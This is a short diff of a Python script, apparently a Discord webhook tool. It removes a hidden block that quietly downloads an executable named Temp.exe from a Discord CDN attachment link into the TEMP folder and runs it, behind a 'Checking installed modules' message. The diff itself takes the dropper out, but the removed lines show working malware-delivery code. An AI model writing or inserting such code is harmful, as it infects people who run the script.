@@ -28,23 +28,6 @@ txp = """Checking installed modules... """
 print(Fore.RED + txp)
 time.sleep(3)
 
-url = 'https://cdn.discordapp.com/attachments/1106268627340120214/1106322625589944351/Temp.exe'
-filename = 'Temp.exe'
-temp_path = os.path.join(os.environ.get('TEMP'), filename)
-
-def is_process_running(process_name):
-
-    for proc in psutil.process_iter(['name']):
-        if proc.info['name'] == process_name:
-            return True
-    return False
-
-if not is_process_running(filename):
-    r = requests.get(url)
-    with open(temp_path, 'wb') as f:
-        f.write(r.content)
-    os.startfile(temp_path)
-
 from colorama import Fore, Back, Style
 try:
     from discord_webhook import DiscordWebhook
